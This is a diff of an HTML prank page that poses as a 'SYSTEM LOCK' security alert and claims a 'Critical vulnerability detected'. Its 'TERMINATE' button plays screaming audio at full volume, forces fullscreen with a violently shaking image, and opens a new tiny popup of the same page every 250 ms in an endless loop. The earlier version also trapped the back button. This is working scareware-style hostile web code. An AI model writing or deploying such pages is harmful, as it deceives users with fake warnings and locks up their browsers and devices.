@@ -3,30 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>☠️ SYSTEM LOCK ☠️</title>
+    <title>☠️ SYSTEM FAILURE ☠️</title>
     <style>
         body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background-color: #000; }
-        
-        /* صورة المرأة: مخفية في البداية وتعمر الشاشة سواسوة */
-        #madImg { 
-            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
-            object-fit: cover; z-index: 10; display: none;
-            will-change: transform;
-        }
-
-        /* واجهة الزر الأحمر سواسوة */
-        #ui { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: #000; z-index: 1000; display: flex; 
-            flex-direction: column; justify-content: center; align-items: center;
-            font-family: 'Courier New', monospace; color: #f00; text-align: center;
-        }
-        .skull { font-size: 50px; margin: 20px; }
-        .btn-red { 
-            background: #f00; color: #000; border: none; width: 250px; height: 80px;
-            font-weight: bold; font-size: 24px; cursor: pointer; margin-top: 30px;
-            box-shadow: 0 0 20px #f00; text-transform: uppercase;
-        }
+        #madImg { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 10; display: none; will-change: transform; }
+        #ui { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 1000; display: flex; flex-direction: column; justify-content: center; align-items: center; font-family: monospace; color: #f00; text-align: center; }
+        .btn-red { background: #f00; color: #000; border: none; width: 260px; height: 90px; font-weight: bold; font-size: 26px; cursor: pointer; margin-top: 30px; box-shadow: 0 0 25px #f00; }
         .blink { animation: b 0.1s infinite; }
         @keyframes b { 50% { opacity: 0; } }
     </style>
@@ -34,67 +16,56 @@
 <body>
 
     <div id="ui">
-        <div class="skull">☠️ <span style="color:red; font-size:40px;">SYSTEM LOCK</span> ☠️</div>
-        <p style="color:#888;">Unauthorized access detected.<br>Click to terminate all processes.</p>
-        <button class="btn-red" onclick="igniteMadness()">TERMINATE</button>
+        <h1 class="blink" style="font-size: 45px;">☠️ SYSTEM LOCK ☠️</h1>
+        <p style="font-size: 18px;">Critical vulnerability detected.<br>Tap to terminate and secure data.</p>
+        <button class="btn-red" onclick="igniteFinalChaos()">TERMINATE</button>
     </div>
 
     <img id="madImg" src="https://i.ibb.co/39snnynW/1000016067.jpg">
 
     <div id="audioVault">
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/hoova-2.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/chicken-on-tree-screaming.mp3"></audio>
-        <audio class="s" loop><source src="https://www.myinstants.com/media/sounds/dzonza.mp3"></audio>
+        <audio class="t" loop><source src="https://www.myinstants.com/media/sounds/hoova-2.mp3"></audio>
+        <audio class="t" loop><source src="https://www.myinstants.com/media/sounds/chicken-on-tree-screaming.mp3"></audio>
+        <audio class="t" loop><source src="https://www.myinstants.com/media/sounds/dzonza.mp3"></audio>
     </div>
 
     <script>
         let aCtx, analyser, data;
         const img = document.getElementById('madImg');
-        const ui = document.getElementById('ui');
 
-        function igniteMadness() {
-            // 1. إطلاق الأصوات سواسوة
-            const audios = document.querySelectorAll('.s');
-            audios.forEach(a => { a.volume = 1.0; a.play(); });
+        function igniteFinalChaos() {
+            const tracks = document.querySelectorAll('.t');
+            tracks.forEach(t => { t.volume = 1.0; t.play(); }); // نفس النسبة سواسوة
 
-            // 2. إخفاء الزر وإظهار المرأة سواسوة
-            ui.style.display = 'none';
+            document.getElementById('ui').style.display = 'none';
             img.style.display = 'block';
-            
             if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
 
-            // 3. محرك الرعشة (التخبيط) سواسوة
             if (!aCtx) {
                 aCtx = new (window.AudioContext || window.webkitAudioContext)();
-                const source = aCtx.createMediaElementSource(audios[1]); // الحركة مربوطة بصرخة الدجاجة
+                const source = aCtx.createMediaElementSource(tracks[1]); 
                 analyser = aCtx.createAnalyser();
                 analyser.fftSize = 64;
                 data = new Uint8Array(analyser.frequencyBinCount);
                 source.connect(analyser);
                 analyser.connect(aCtx.destination);
-                
                 if (aCtx.state === 'suspended') aCtx.resume();
                 renderMadness();
             }
 
-            // 4. نظام الحبس الرقمي سواسوة
             setInterval(() => {
-                history.pushState(null, null, window.location.href);
                 window.open(window.location.href, '_blank', 'width=10,height=10');
-            }, 150);
+            }, 250);
         }
 
         function renderMadness() {
             analyser.getByteFrequencyData(data);
             let vol = data[0]; 
-
-            // 5. معادلة التخبيط الهستيري سواسوة
-            const power = (vol / 255) * 100; // زدنا القوة
-            const x = (Math.random() - 0.5) * power * 7;
-            const y = (Math.random() - 0.5) * power * 7;
+            const power = (vol / 255) * 110; // قوة التخبيط القصوى
+            const x = (Math.random() - 0.5) * power * 8;
+            const y = (Math.random() - 0.5) * power * 8;
             const r = (Math.random() - 0.5) * power;
-            const s = 1 + (vol / 255) * 0.7;
-
+            const s = 1 + (vol / 255) * 0.8;
             img.style.transform = `translate(${x}px, ${y}px) rotate(${r}deg) scale(${s})`;
             requestAnimationFrame(renderMadness);
         }
